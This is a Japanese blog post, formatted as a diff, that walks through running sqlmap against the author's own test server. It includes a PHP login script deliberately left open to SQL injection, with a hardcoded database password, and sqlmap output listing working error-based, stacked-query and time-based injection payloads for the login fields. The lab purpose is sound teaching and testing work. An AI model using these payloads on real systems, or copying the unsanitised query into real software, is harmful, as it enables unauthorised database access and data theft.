@@ -1,0 +1,981 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>sqlmapでSQLインジェクションの検証 - seak0503 Blog</title>
+  <meta name="author" content="seak0503">
+
+  
+  <meta name="description" content="目次 はじめに 対応しているDB 検知できるSQLインジェクションの種類 検証環境 攻撃対象サイト sqlmapインストール 使い方 脆弱性診断をする データベースの一覧を取得する テーブルの一覧を取得する テーブルデータのダンプ(usersテーブル) 最後に はじめに &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://blog.seak.jp.net/blog/2014/05/20/sqlmap/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="seak0503 Blog" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <nav role="navigation"><ul class="subscription" data-subscription="rss email">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+    <li><a href="seak0503.gmail.com" rel="subscribe-email" title="subscribe via email">Email</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:blog.seak.jp.net" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+    <li><a href="/">
+        <span class="blue_light">
+            seak0503 Blog
+        </span>
+       
+    </a></li>
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About me</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">sqlmapでSQLインジェクションの検証</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-05-20T07:35:25+09:00" pubdate data-updated="true">2014-05-20</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><!-- more -->
+
+
+
+
+<h2>目次</h2>
+
+
+<p><ul>
+ <li><ul>
+  <li><a href="#L............">はじめに</a></li>
+  <li><a href="#L..................DB">対応しているDB</a></li>
+  <li><a href="#L...............SQL.................................">検知できるSQLインジェクションの種類</a></li>
+  <li><a href="#L............">検証環境</a></li>
+  <li><a href="#L.....................">攻撃対象サイト</a></li>
+  <li><a href="#sqlmap..................">sqlmapインストール</a></li>
+  <li><a href="#L.........">使い方</a></li>
+  <li><a href="#L........................">脆弱性診断をする</a></li>
+  <li><a href="#L..........................................">データベースの一覧を取得する</a></li>
+  <li><a href="#L....................................">テーブルの一覧を取得する</a></li>
+  <li><a href="#L..................................users.............">テーブルデータのダンプ(usersテーブル)</a></li>
+  <li><a href="#L.........">最後に</a></li>
+ </ul></li>
+</ul>
+
+</p>
+
+<a name="L............"></a>
+<h2>はじめに</h2>
+
+<p>ここではpython製のツールである、sqlmapを使って
+SQLインジェクションの検証をします。</p>
+
+<p>検証目的ですので、自分でたてたテストサーバにSQLインジェクションを
+しかけます。</p>
+
+<a name="L..................DB"></a>
+<h2>対応しているDB</h2>
+
+<ul>
+<li>MySQL</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+<li>Microsoft SQL Server</li>
+<li>Microsoft Access</li>
+<li>IBM DB2</li>
+<li>SQLite</li>
+<li>Firebird</li>
+<li>Sybase</li>
+<li>SAP MaxDB</li>
+</ul>
+
+
+<a name="L...............SQL................................."></a>
+<h2>検知できるSQLインジェクションの種類</h2>
+
+<ul>
+<li>boolean-based blind</li>
+<li>time-based blind</li>
+<li>error-based</li>
+<li>UNION query</li>
+<li>stacked queries</li>
+<li>out-of-band</li>
+</ul>
+
+
+<a name="L............"></a>
+<h2>検証環境</h2>
+
+<ul>
+<li><p>攻撃用サーバ(sqlmap実行側):</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>Python: python2.2.6</p></li>
+</ul>
+</li>
+<li><p>攻撃対象サーバ:</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>php: 5.3.2</p></li>
+<li><p>Apache: 2.2.25</p></li>
+<li><p>PostgreSQL: 9.2.5</p></li>
+</ul>
+</li>
+</ul>
+
+
+<a name="L....................."></a>
+<h2>攻撃対象サイト</h2>
+
+<p>下記のPHPスクリプトを用意しました。</p>
+
+<p>ログインフォーム(sql_injection-002.html):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
+</span><span class='line'><span class="nt">&lt;head&gt;&lt;title&gt;</span>ログインしてください<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
+</span><span class='line'><span class="nt">&lt;body&gt;</span>
+</span><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;sql_injection-003.php&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>ユーザ名<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;ID&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
+</span><span class='line'>パスワード<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;PWD&quot;</span><span class="nt">&gt;&lt;br&gt;</span>
+</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;submit&quot;</span> <span class="na">value=</span><span class="s">&quot;ログイン&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'><span class="nt">&lt;/form&gt;</span>
+</span><span class='line'><span class="nt">&lt;/body&gt;</span>
+</span><span class='line'><span class="nt">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ログイン処理スクリプト(sql_injection-003.php):</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'>  <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: text/html; charset=UTF-8&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$id</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ID&#39;</span><span class="p">];</span>   <span class="c1">// ユーザID</span>
+</span><span class='line'>  <span class="nv">$pwd</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;PWD&#39;</span><span class="p">];</span> <span class="c1">// パスワード</span>
+</span><span class='line'>  <span class="c1">// データベースに接続しコネクションオブジェクトを生成</span>
+</span><span class='line'>  <span class="nv">$con</span> <span class="o">=</span> <span class="nb">pg_connect</span><span class="p">(</span><span class="s2">&quot;host=localhost dbname=wasbook user=postgres password=wasbook&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="c1">// SQLの組み立て(プレースホルダは意図的に使用しない)</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users WHERE id =&#39;</span><span class="si">$id</span><span class="s2">&#39; and PWD = &#39;</span><span class="si">$pwd</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$rs</span> <span class="o">=</span> <span class="nx">pg_query</span><span class="p">(</span><span class="nv">$con</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>  <span class="c1">// クエリー実行</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">&lt;body&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">pg_num_rows</span><span class="p">(</span><span class="nv">$rs</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// SELECTした行が存在する場合ログイン成功</span>
+</span><span class='line'>    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$id</span><span class="p">;</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s1">&#39;ログイン成功です&#39;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>    <span class="k">echo</span> <span class="s1">&#39;ログイン失敗です&#39;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nb">pg_close</span><span class="p">(</span><span class="nv">$con</span><span class="p">);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<a name="sqlmap.................."></a>
+<h2>sqlmapインストール</h2>
+
+<p>GitHからリポジトリをフォークするだけです。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>git clone https://github.com/sqlmapproject/sqlmap.git
+</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>sqlmap
+</span></code></pre></td></tr></table></div></figure>
+
+
+<a name="L........."></a>
+<h2>使い方</h2>
+
+<p>他の方が説明をしてくれているので、ここでは細かい説明はしませんが、基本的なことだけ</p>
+
+<p>GETメソッドの場合の例:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>python sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php?ID=1&amp;PWD=2&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>POSTメソッドの場合の例:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>python sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php&quot;</span> --data <span class="s2">&quot;ID=1&amp;PWD=2&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>基本的なコマンド:</p>
+
+<table>
+<thead>
+<tr>
+<th align="left">コマンド(center)</th>
+<th align="left">説明(center)                                 </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">&#8211;dbs           </td>
+<td align="left">データベースの一覧を取得</td>
+</tr>
+<tr>
+<td align="left">&#8211;tables        </td>
+<td align="left">テーブルの一覧を取得 </td>
+</tr>
+<tr>
+<td align="left">-D              </td>
+<td align="left">データベースの指定(PostgreSQLではサーチパス)</td>
+</tr>
+<tr>
+<td align="left">-T              </td>
+<td align="left">テーブルの指定</td>
+</tr>
+<tr>
+<td align="left">&#8211;colums        </td>
+<td align="left">-Tと一緒に使いテーブル定義を一覧</td>
+</tr>
+<tr>
+<td align="left">&#8211;dump          </td>
+<td align="left">-Tと一緒に使いテーブルデータをダンプ</td>
+</tr>
+</tbody>
+</table>
+
+
+<a name="L........................"></a>
+<h2>脆弱性診断をする</h2>
+
+<p>診断を開始します:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./sqlmap.py -u <span class="s2">&quot;http://example.jp/sql_injection-003.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ID=1&amp;PWD=2&quot;</span> --dbms PostgreSQL
+</span><span class='line'>
+</span><span class='line'>    sqlmap/1.0-dev-67115ed - automatic SQL injection and database takeover tool
+</span><span class='line'>    http://sqlmap.org
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for </span>attacking targets without prior mutual consent is illegal. It is the end user<span class="s1">&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[*] starting at 07:05:04</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">[07:05:04] [WARNING] using &#39;</span>/home/shyamahira/.sqlmap/output<span class="s1">&#39; as the output directory</span>
+</span><span class='line'><span class="s1">[07:05:04] [INFO] testing connection to the target URL</span>
+</span><span class='line'><span class="s1">[07:05:04] [INFO] testing if the target URL is stable. This can take a couple of seconds</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] target URL is stable</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing if POST parameter &#39;</span>ID<span class="s1">&#39; is dynamic</span>
+</span><span class='line'><span class="s1">[07:05:05] [WARNING] POST parameter &#39;</span>ID<span class="s1">&#39; does not appear dynamic</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] heuristic (basic) test shows that POST parameter &#39;</span>ID<span class="s1">&#39; might be injectable (possible DBMS: &#39;</span>PostgreSQL<span class="s1">&#39;)</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing for SQL injection on POST parameter &#39;</span>ID<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing &#39;</span>AND boolean-based blind - WHERE or HAVING clause<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing &#39;</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] POST parameter &#39;</span>ID<span class="s1">&#39; is &#39;</span>PostgreSQL AND error-based - WHERE or HAVING clause<span class="s1">&#39; injectable </span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing &#39;</span>PostgreSQL inline queries<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:05] [INFO] testing &#39;</span>PostgreSQL &gt; 8.1 stacked queries<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:05] [WARNING] time-based comparison requires larger statistical model, please wait.....                                                </span>
+</span><span class='line'><span class="s1">[07:05:15] [INFO] POST parameter &#39;</span>ID<span class="s1">&#39; seems to be &#39;</span>PostgreSQL &gt; 8.1 stacked queries<span class="s1">&#39; injectable </span>
+</span><span class='line'><span class="s1">[07:05:15] [INFO] testing &#39;</span>PostgreSQL &gt; 8.1 AND <span class="nb">time</span>-based blind<span class="s1">&#39;</span>
+</span><span class='line'><span class="s1">[07:05:25] [INFO] POST parameter &#39;</span>ID<span class="s1">&#39; seems to be &#39;</span>PostgreSQL &gt; 8.1 AND <span class="nb">time</span>-based blind<span class="s1">&#39; injectable </span>
+</span><span class='line'><span class="s1">[07:05:25] [INFO] testing &#39;</span>Generic UNION query <span class="o">(</span>NULL<span class="o">)</span> - 1 to 20 columns<span class="err">&#39;</span>
+</span><span class='line'><span class="o">[</span>07:05:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> automatically extending ranges <span class="k">for </span>UNION query injection technique tests as there is at least one other <span class="o">(</span>potential<span class="o">)</span> technique found
+</span><span class='line'><span class="o">[</span>07:05:25<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> reflective value<span class="o">(</span>s<span class="o">)</span> found and filtering out
+</span><span class='line'><span class="o">[</span>07:05:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> ORDER BY technique seems to be usable. This should reduce the <span class="nb">time </span>needed to find the right number of query columns. Automatically extending the range <span class="k">for </span>current UNION query injection technique <span class="nb">test</span>
+</span><span class='line'><span class="o">[</span>07:05:25<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> target URL appears to have 6 columns in query
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>以下のように聞かれたら、Yで応答します:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>injection not exploitable with NULL values. Do you want to try with a random integer value <span class="k">for </span>option <span class="s1">&#39;--union-char&#39;</span>? <span class="o">[</span>Y/n<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>IDパラメータで脆弱性が検出されました:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>POST parameter <span class="s1">&#39;ID&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>上記メッセージをyで応答し、処理を進めます:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">if </span>POST parameter <span class="s1">&#39;PWD&#39;</span> is dynamic
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> POST parameter <span class="s1">&#39;PWD&#39;</span> does not appear dynamic
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> heuristic <span class="o">(</span>basic<span class="o">)</span> <span class="nb">test </span>shows that POST parameter <span class="s1">&#39;PWD&#39;</span> might be injectable <span class="o">(</span>possible DBMS: <span class="s1">&#39;PostgreSQL&#39;</span><span class="o">)</span>
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="k">for </span>SQL injection on POST parameter <span class="s1">&#39;PWD&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;PWD&#39;</span> is <span class="s1">&#39;PostgreSQL AND error-based - WHERE or HAVING clause&#39;</span> injectable
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL inline queries&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:07<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL &gt; 8.1 stacked queries&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:17<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;PWD&#39;</span> seems to be <span class="s1">&#39;PostgreSQL &gt; 8.1 stacked queries&#39;</span> injectable
+</span><span class='line'><span class="o">[</span>07:10:17<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;</span>
+</span><span class='line'><span class="o">[</span>07:10:27<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> POST parameter <span class="s1">&#39;PWD&#39;</span> seems to be <span class="s1">&#39;PostgreSQL &gt; 8.1 AND time-based blind&#39;</span> injectable
+</span><span class='line'><span class="o">[</span>07:10:27<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing <span class="s1">&#39;Generic UNION query (60) - 1 to 20 columns&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>PWDパラメータで脆弱性が検出されました:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>POST parameter <span class="s1">&#39;PWD&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if </span>any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>上記メッセージをyで応答し、処理を進めます:</p>
+
+<p>PWDとIDパラメータにerror-basedのSQLインジェクションの脆弱性があると診断診断されました:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>sqlmap identified the following injection points with a total of 101 HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span><span class='line'>---
+</span><span class='line'>Place: POST
+</span><span class='line'>Parameter: PWD
+</span><span class='line'>    Type: error-based
+</span><span class='line'>    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+</span><span class='line'>    Payload: <span class="nv">ID</span><span class="o">=</span>1&amp;PWD<span class="o">=</span>2<span class="s1">&#39; AND 5991=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (5991=5991) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND &#39;</span>iBQp<span class="s1">&#39;=&#39;</span>iBQp
+</span><span class='line'>
+</span><span class='line'>    Type: stacked queries
+</span><span class='line'>    Title: PostgreSQL &gt; 8.1 stacked queries
+</span><span class='line'>    Payload: <span class="nv">ID</span><span class="o">=</span>1&amp;PWD<span class="o">=</span>2<span class="s1">&#39;; SELECT PG_SLEEP(5)--</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">    Type: AND/OR time-based blind</span>
+</span><span class='line'><span class="s1">    Title: PostgreSQL &gt; 8.1 AND time-based blind</span>
+</span><span class='line'><span class="s1">    Payload: ID=1&amp;PWD=2&#39;</span> AND <span class="nv">9601</span><span class="o">=(</span>SELECT 9601 FROM PG_SLEEP<span class="o">(</span>5<span class="o">))</span> AND <span class="s1">&#39;oMeE&#39;</span><span class="o">=</span><span class="s1">&#39;oMeE</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">Place: POST</span>
+</span><span class='line'><span class="s1">Parameter: ID</span>
+</span><span class='line'><span class="s1">    Type: error-based</span>
+</span><span class='line'><span class="s1">    Title: PostgreSQL AND error-based - WHERE or HAVING clause</span>
+</span><span class='line'><span class="s1">    Payload: ID=1&#39;</span> AND <span class="nv">3272</span><span class="o">=</span>CAST<span class="o">((</span>CHR<span class="o">(</span>113<span class="o">)||</span>CHR<span class="o">(</span>112<span class="o">)||</span>CHR<span class="o">(</span>99<span class="o">)||</span>CHR<span class="o">(</span>112<span class="o">)||</span>CHR<span class="o">(</span>113<span class="o">))||(</span>SELECT <span class="o">(</span>CASE WHEN <span class="o">(</span><span class="nv">3272</span><span class="o">=</span>3272<span class="o">)</span> THEN 1 ELSE 0 END<span class="o">))</span>::text||<span class="o">(</span>CHR<span class="o">(</span>113<span class="o">)||</span>CHR<span class="o">(</span>112<span class="o">)||</span>CHR<span class="o">(</span>117<span class="o">)||</span>CHR<span class="o">(</span>117<span class="o">)||</span>CHR<span class="o">(</span>113<span class="o">))</span> AS NUMERIC<span class="o">)</span> AND <span class="s1">&#39;ahLa&#39;</span><span class="o">=</span><span class="s1">&#39;ahLa&amp;PWD=2</span>
+</span><span class='line'>
+</span><span class='line'><span class="s1">    Type: stacked queries</span>
+</span><span class='line'><span class="s1">    Title: PostgreSQL &gt; 8.1 stacked queries</span>
+</span><span class='line'><span class="s1">    Payload: ID=1&#39;</span>; SELECT PG_SLEEP<span class="o">(</span>5<span class="o">)</span>--&amp;PWD<span class="o">=</span>2
+</span><span class='line'>
+</span><span class='line'>    Type: AND/OR <span class="nb">time</span>-based blind
+</span><span class='line'>    Title: PostgreSQL &gt; 8.1 AND <span class="nb">time</span>-based blind
+</span><span class='line'>    Payload: <span class="nv">ID</span><span class="o">=</span>1<span class="s1">&#39; AND 3167=(SELECT 3167 FROM PG_SLEEP(5)) AND &#39;</span>GbHI<span class="s1">&#39;=&#39;</span>GbHI&amp;PWD<span class="o">=</span>2
+</span><span class='line'>---
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ここではQuitで止めます:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>there were multiple injection points, please <span class="k">select </span>the one to use <span class="k">for </span>following injections:
+</span><span class='line'><span class="o">[</span>0<span class="o">]</span> place: POST, parameter: ID, <span class="nb">type</span>: Single quoted string <span class="o">(</span>default<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>1<span class="o">]</span> place: POST, parameter: PWD, <span class="nb">type</span>: Single quoted string
+</span><span class='line'><span class="o">[</span>q<span class="o">]</span> Quit
+</span></code></pre></td></tr></table></div></figure>
+
+
